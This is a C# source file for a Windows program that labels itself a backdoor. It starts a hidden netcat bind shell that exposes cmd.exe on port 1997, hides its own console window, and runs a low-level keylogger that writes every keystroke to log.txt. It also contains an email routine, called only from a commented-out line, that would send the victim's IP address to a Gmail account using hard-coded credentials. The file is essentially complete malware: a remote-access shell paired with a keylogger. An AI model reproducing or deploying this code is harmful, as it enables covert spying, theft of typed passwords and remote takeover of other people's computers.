using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.IO;
using Microsoft.Win32;

namespace ConsoleApp1
{
    class Program
    {

        #region Global Variables
        static TcpListener tcpListener = new TcpListener(IPAddress.Any, 1997);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        #endregion

        static void Main(string[] args)
        {
            #region Listener
            byte[] packetData = Encoding.ASCII.GetBytes("Hello from backdoor 1");
            string ipAddress = GetLocalIPAddress();
            int portNumber = 1997;
            //sendIP();

            IPEndPoint otherServer = new IPEndPoint(IPAddress.Parse(ipAddress), portNumber);

            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            client.SendTo(packetData, otherServer);
            Process serverListener = new Process();
            serverListener.StartInfo.FileName = "nc.exe";
            serverListener.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
            serverListener.StartInfo.Arguments = "-l -p 1997 -v -e cmd.exe";
            serverListener.Start();
            #endregion

            #region Key Logger
            var handle = GetConsoleWindow();

            //Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            #endregion
        }

        #region Key Logger
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                if((Keys)vkCode == Keys.Return)
                {
                    sw.Write(Environment.NewLine);
                }
                else if((Keys)vkCode == Keys.Space)
                {
                    sw.Write(" ");
                }
                else if((Keys)vkCode == Keys.Capital)
                {

                }
                else if((Keys)vkCode == Keys.OemPeriod)
                {
                    sw.Write(".");
                }
                else if(((Keys)vkCode == Keys.D0))
                {
                    sw.Write("0");
                }
                else if(((Keys)vkCode == Keys.D1))
                {
                    sw.Write("1");
                }
                else if(((Keys)vkCode == Keys.D2))
                {
                    sw.Write("2");
                }
                else if(((Keys)vkCode == Keys.D3))
                {
                    sw.Write("3");
                }
                else if(((Keys)vkCode == Keys.D4))
                {
                    sw.Write("4");
                }
                else if(((Keys)vkCode == Keys.D5))
                {
                    sw.Write("5");
                }
                else if(((Keys)vkCode == Keys.D6))
                {
                    sw.Write("6");
                }
                else if(((Keys)vkCode == Keys.D7))
                {
                    sw.Write("7");
                }
                else if(((Keys)vkCode == Keys.D8))
                {
                    sw.Write("8");
                }
                else if(((Keys)vkCode == Keys.D9))
                {
                    sw.Write("9");
                }
                else
                {
                    sw.Write((Keys)vkCode);
                }

                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        #endregion

        #region Obtaining IP Address
        private static string GetStandardBrowserPath()
        {
            string browserPath = string.Empty;
            RegistryKey browserKey = null;

            try
            {
                //Read default browser path from Win XP registry key
                browserKey = Registry.ClassesRoot.OpenSubKey(@"HTTP\shell\open\command", false);

                //If browser path wasn't found, try Win Vista (and newer) registry key
                if (browserKey == null)
                {
                    browserKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http", false); ;
                }

                //If browser path was found, clean it
                if (browserKey != null)
                {
                    //Remove quotation marks
                    browserPath = (browserKey.GetValue(null) as string).ToLower().Replace("\"", "");

                    //Cut off optional parameters
                    if (!browserPath.EndsWith("exe"))
                    {
                        browserPath = browserPath.Substring(0, browserPath.LastIndexOf(".exe") + 4);
                    }

                    //Close registry key
                    browserKey.Close();
                }
            }
            catch
            {
                //Return empty string, if no path was found
                return string.Empty;
            }
            //Return default browsers path
            return browserPath;
        }

        public static void sendIP()
        {
            // You should use a using statement
            using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
            {
                // Configure the client
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential("sporject05@gmail.com", "p@$$w0rd");
                // client.UseDefaultCredentials = true;

                // A client has been created, now you need to create a MailMessage object
                MailMessage message = new MailMessage(
                                         "from@example.com", // From field
                                         "sporject05@gmail.com", // Recipient field
                                         "Hello", // Subject of the email message
                                         GetLocalIPAddress() // Email message body
                                      );

                // Send the message
                client.Send(message);
            }
        } 
        #endregion
        
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
    }
}
